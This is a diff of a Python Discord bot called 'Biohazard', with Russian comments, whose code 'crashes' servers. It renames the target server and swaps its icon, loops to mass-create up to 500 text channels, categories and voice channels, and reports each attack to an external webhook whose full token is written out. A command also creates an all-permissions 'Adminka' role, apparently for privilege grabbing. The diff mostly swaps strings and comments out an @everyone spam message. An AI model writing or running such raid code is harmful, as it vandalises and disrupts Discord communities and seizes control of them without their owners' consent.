@@ -13,7 +13,6 @@ class MyClient(discord.Client):
 		await client.change_presence(activity = discord.Game('Крутой бот | v2.6'))
 		
 	async def on_message(self, message):
-		global cooldown
 		c = 0
 		r = 0
 		m = 0
@@ -135,9 +134,9 @@ class MyClient(discord.Client):
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
 				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
-				if message.guild.name != '__...-<<CRASHED>>-...__' and len(message.guild.members) > 5:
+				if message.guild.name != 'Biohazard CRASH' and len(message.guild.members) > 5:
 					response = webhook.execute()
-				await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание сервера
+				await message.guild.edit(name='Biohazard CRASH') #переименовывание сервера
 				with open('chaos.jpeg', 'rb') as f:
 					icon = f.read()
 				await message.guild.edit(icon=icon)
@@ -174,8 +173,8 @@ class MyClient(discord.Client):
 				await asyncio.sleep(0.1)
 				try:
 					while c < 500:
-						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
-						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
+						await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
+						#await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_category('Crash by Biohazard') #создание категории
 						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
 						c += 1
@@ -218,7 +217,7 @@ class MyClient(discord.Client):
 				await message.delete()
 				await asyncio.sleep(0.1)
 				try:
-					await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание
+					await message.guild.edit(name='Biohazard CRASH') #переименовывание
 					with open('chaos.jpeg', 'rb') as f:
 						icon = f.read()
 					await message.guild.edit(icon=icon)
@@ -306,7 +305,7 @@ class MyClient(discord.Client):
 				
 			if message.content == '*админка': #выдаёт админку
 				await message.delete()
-				role = await message.guild.create_role(name="Adminka", permissions=Permissions.all())
+				await message.guild.create_role(name="Adminka", permissions=discord.Permissions.all())
 				
 				
 			if message.content == '*лс':
